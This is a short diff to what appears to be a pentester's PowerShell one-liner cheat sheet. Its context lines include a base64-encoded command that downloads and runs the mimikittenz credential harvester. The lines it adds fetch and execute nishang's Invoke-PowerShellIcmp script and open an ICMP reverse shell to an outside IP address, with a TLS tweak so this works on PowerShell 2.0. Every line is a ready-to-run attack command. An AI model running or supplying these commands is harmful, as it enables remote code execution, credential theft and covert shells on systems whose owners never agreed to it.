@@ -17,6 +17,10 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 #encoded-mimikittenz [local]
 powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==
+  
+  
+#Run DownloadString on Powershell 2.0 without Tls1.2 and RunICMP Shell
+$tls12 = [Enum]::ToObject([Net.SecurityProtocolType], 3072);[Net.ServicePointManager]::SecurityProtocol = $tls12;IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 172.25.100.245
 
 
 
